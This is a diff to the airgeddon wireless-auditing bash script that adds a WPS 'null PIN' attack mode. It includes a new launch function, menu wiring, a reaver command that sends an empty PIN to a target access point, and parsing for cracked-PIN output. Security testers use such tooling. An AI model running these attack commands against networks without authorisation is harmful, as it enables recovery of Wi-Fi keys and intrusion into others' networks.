@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190414
+#Date.........: 20190415
 #Version......: 9.20
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -3585,6 +3585,24 @@ function exec_wps_pin_database_reaver_attack() {
 	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
 }
 
+#Execute wps null pin reaver attack
+function exec_reaver_nullpin_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	set_wps_attack_script "reaver" "nullpin"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
+}
+
 #Execute DoS pursuit mode attack
 function launch_dos_pursuit_mode_attack() {
 
@@ -4211,7 +4229,7 @@ function wep_option() {
 	exec_wep_allinone_attack
 }
 
-#Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
+#Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
 function wps_attacks_parameters() {
 
 	debug_print
@@ -4246,6 +4264,9 @@ function wps_attacks_parameters() {
 				ask_timeout "wps_pixiedust"
 			;;
 			"pindb_bully"|"pindb_reaver")
+				ask_timeout "wps_standard"
+			;;
+			"nullpin_reaver")
 				ask_timeout "wps_standard"
 			;;
 		esac
@@ -5594,8 +5615,7 @@ function wps_attacks_menu() {
 					language_strings "${language}" 115 "read"
 					if wps_attacks_parameters; then
 						manage_wps_log
-						#TODO set here exec_reaver_nullpin_attack function (not created yet)
-						under_construction_message
+						exec_reaver_nullpin_attack
 					fi
 				else
 					echo
@@ -8376,6 +8396,9 @@ function set_wps_attack_script() {
 			"bruteforce")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -d 2 -vvv"
 			;;
+			"nullpin")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p ''"
+			;;
 		esac
 	else
 		unbuffer="unbuffer "
@@ -8429,6 +8452,10 @@ function set_wps_attack_script() {
 				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
 				pin_header1="${white_color}Testing all possible PINs${normal_color}"
 			;;
+			"nullpin")
+				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				pin_header1="${white_color}Testing null PIN"
+			;;
 		esac
 
 		pin_header2=" (${yellow_color}"
@@ -8479,7 +8506,7 @@ function set_wps_attack_script() {
 	cat >&7 <<-'EOF'
 			if [ "${script_wps_attack_tool}" = "reaver" ]; then
 				case ${script_wps_attack_mode} in
-					"pindb"|"custompin"|"bruteforce")
+					"pindb"|"custompin"|"bruteforce"|"nullpin")
 						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
 						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
 						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
@@ -8508,7 +8535,7 @@ function set_wps_attack_script() {
 			fi
 
 			case ${script_wps_attack_mode} in
-				"pindb"|"custompin")
+				"pindb"|"custompin"|"nullpin")
 					for item in "${LINES_TO_PARSE[@]}"; do
 						if [ "${script_wps_attack_tool}" = "reaver" ]; then
 							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
@@ -8597,6 +8624,14 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			elif [ "${script_wps_attack_mode}" = "nullpin" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
 			else
 				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
 			fi
@@ -8711,6 +8746,12 @@ function set_wps_attack_script() {
 				if [ "${script_wps_attack_tool}" = "bully" ]; then
 					echo
 				fi
+				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
+				parse_output
+			;;
+			"nullpin")
+				echo
+				echo -e "${pin_header1}"
 				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
 				parse_output
 			;;
